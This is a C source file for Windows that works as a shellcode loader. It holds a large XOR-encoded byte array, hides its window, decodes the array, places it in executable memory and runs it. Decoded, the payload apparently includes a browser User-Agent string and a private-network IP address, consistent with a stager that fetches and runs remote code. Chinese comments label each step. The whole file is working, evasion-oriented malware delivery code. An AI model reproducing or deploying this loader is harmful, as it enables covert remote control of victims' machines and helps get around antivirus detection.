#include "windows.h"
#include "stdio.h"
#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"")//运行时不显示窗口
#define KEY 0x01
char bufff[] = "\xfd\xe9\x88\x1\x1\x1\x61\x88\xe4\x30\xd3\x65\x8a\x53\x31\x8a\x53\xd\x8a\x53\x15\x8a\x73\x29\xe\xb6\x4b\x27\x30\xfe\x30\xc1\xad\x3d\x60\x7d\x3\x2d\x21\xc0\xce\xc\x0\xc6\xe3\xf1\x53\x56\x8a\x53\x11\x8a\x43\x3d\x0\xd1\x8a\x41\x79\x84\xc1\x75\x4b\x0\xd1\x51\x8a\x49\x19\x8a\x59\x21\x0\xd2\xe2\x3d\x48\x8a\x35\x8a\x0\xd7\x30\xfe\x30\xc1\xad\xc0\xce\xc\x0\xc6\x39\xe1\x74\xf5\x2\x7c\xf9\x3a\x7c\x25\x74\xe3\x59\x8a\x59\x25\x0\xd2\x67\x8a\xd\x4a\x8a\x59\x1d\x0\xd2\x8a\x5\x8a\x0\xd1\x88\x45\x25\x25\x5a\x5a\x60\x58\x5b\x50\xfe\xe1\x59\x5e\x5b\x8a\x13\xea\x87\x5c\x69\x6f\x64\x75\x1\x69\x76\x68\x6f\x68\x55\x69\x4d\x76\x27\x6\xfe\xd4\xe9\x1\x1\x1\x1\x30\xfe\x56\x56\x56\x56\x56\x69\x3b\x57\x78\xa6\xfe\xd4\xe8\xa5\x1\x1\x1\x5a\x30\xc8\x50\x50\x6b\x2\x50\x50\x69\xba\x0\x1\x1\x52\x51\x69\x56\x88\x9e\xc7\xfe\xd4\x51\xe8\x8d\x1\x1\x1\x5a\x30\xd3\x53\x69\x1\x33\xc1\x85\x53\x53\x53\x52\x53\x51\x69\xea\x54\x2f\x3a\xfe\xd4\x88\xc7\x82\xc2\x51\x69\x81\x32\x1\x1\x88\xe1\x6b\x5\x51\x6b\x1e\x57\x69\x74\x47\x9f\x87\xfe\xd4\x5e\x30\xfe\x56\x56\x6b\xfe\x52\x57\x69\x2c\x7\x19\x7a\xfe\xd4\x84\xc1\xe\x85\xcb\x0\x1\x1\x30\xfe\x84\xf7\x75\x5\x88\xf8\xea\x8\x69\xab\xc4\xe3\x5c\xfe\xd4\x88\xc0\x69\x44\x20\x5f\x30\xfe\xd4\x30\xfe\x56\x6b\x6\x50\x57\x51\x69\xb6\x56\xe1\xa\xfe\xd4\xbe\x1\x2e\x1\x1\x38\xc6\x74\x6\x59\x51\xe8\x7a\xfe\xfe\xfe\x30\xfe\xe8\x90\x0\x1\x1\xe8\xc8\x0\x1\x1\xe9\x6e\xfe\xfe\xfe\x2e\x6a\x70\x39\x49\x1\xca\x5f\x49\xea\x93\x24\x69\xb3\x33\x1a\x3d\x44\xef\x81\xda\x9d\x9b\xbc\x8f\x34\xa9\x86\xce\x2a\x8c\x3e\x5b\xbe\xea\xd2\xba\x41\xfb\x16\xa1\x5c\x7\x9b\x1a\xd5\x41\xaf\x95\x5f\xf6\xbf\xd\xb\x9b\x63\xcd\x91\x39\x50\x1\x89\x2c\x3c\x34\x40\xc8\xf8\xff\x5a\x7e\xd3\xb1\x5b\x44\x93\x7\x5b\x25\x1\x54\x72\x64\x73\x2c\x40\x66\x64\x6f\x75\x3b\x21\x4c\x6e\x7b\x68\x6d\x6d\x60\x2e\x35\x2f\x31\x21\x29\x62\x6e\x6c\x71\x60\x75\x68\x63\x6d\x64\x3a\x21\x4c\x52\x48\x44\x21\x39\x2f\x31\x3a\x21\x56\x68\x6f\x65\x6e\x76\x72\x21\x4f\x55\x21\x34\x2f\x30\x3a\x21\x55\x73\x68\x65\x64\x6f\x75\x2e\x35\x2f\x31\x28\xc\xb\x1\x8f\x99\x4\x5a\xb9\xe3\x74\x49\xbf\xc9\xb3\x6\x65\xd\x27\xe9\x45\xd0\x57\x2\xc5\x20\x71\x1e\xf8\x4f\x5c\xbb\x10\xfa\xd3\x3e\x6a\xd3\xd1\xa8\x83\x52\xd9\x8f\xcc\xd8\x9d\x99\x46\x92\xea\x18\x29\x70\x1\x7b\xe9\x94\x72\x2b\xde\x72\x81\x96\xc6\x6f\x79\x2\x45\x45\x6d\x79\x23\x7\x6d\x2d\x74\x21\xaa\xf2\x5b\x87\x43\x5e\xf\x28\x97\x34\x22\x2a\xa5\x76\xbd\xe1\xff\xf8\xea\xa3\x68\x8d\x81\xbe\xf6\xb5\x78\x9c\xd7\x91\x5\xb\x71\xf7\x31\x63\xdd\xd\x41\x5b\xfd\x5e\xcb\xba\xaf\x87\xcb\xcc\x14\x8b\x59\x8b\x66\x7e\x59\x73\xd4\x80\x7\x4\x1c\x2\xdf\xdb\xce\x22\x74\x79\x20\x74\x6e\x7c\xd3\x5\x89\xbe\xca\x43\x21\xa6\xe8\x1a\x51\x23\xc9\x2c\xc1\xdb\x87\x8e\xfc\x25\xba\xe9\x59\x97\xcb\x8b\x89\xca\x9\x81\xad\xfa\x7b\x9a\x65\x1\x1f\x35\x16\x3e\xd2\x7c\x8c\x9a\xe3\xc9\x4\x4d\x5\x40\xdc\x52\xca\xbf\xae\xcb\xcf\xde\x6\x66\x9e\xca\x26\x28\x4d\x18\x5f\xf\x22\x94\x7\xf6\x43\x17\xe8\x37\x22\xba\x38\x1\x69\xf1\xb4\xa3\x57\xfe\xd4\x6b\x41\x69\x1\x11\x1\x1\x69\x1\x1\x41\x1\x56\x69\x59\xa5\x52\xe4\xfe\xd4\x92\xb8\x1\x1\x1\x1\x0\xd8\x50\x52\x88\xe6\x56\x69\x1\x21\x1\x1\x52\x57\x69\x13\x97\x88\xe3\xfe\xd4\x84\xc1\x75\xc7\x8a\x6\x0\xc2\x84\xc1\x74\xe4\x59\xc2\xe9\x88\xfc\xfe\xfe\x30\x38\x33\x2f\x30\x37\x39\x2f\x30\x33\x35\x2f\x30\x32\x34\x1\x13\x35\x57\x79";
void main()
{
    unsigned char buff[sizeof(bufff)];   //获取shellcode长度
    for (int i = 0; i < sizeof(bufff) - 1; i++) {
        buff[i] = bufff[i] ^ KEY;//进行解密
    }
        LPVOID Memory = VirtualAlloc(NULL, sizeof(buff), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        memcpy(Memory, buff, sizeof(buff));
        ((void(*)())Memory)();
    }

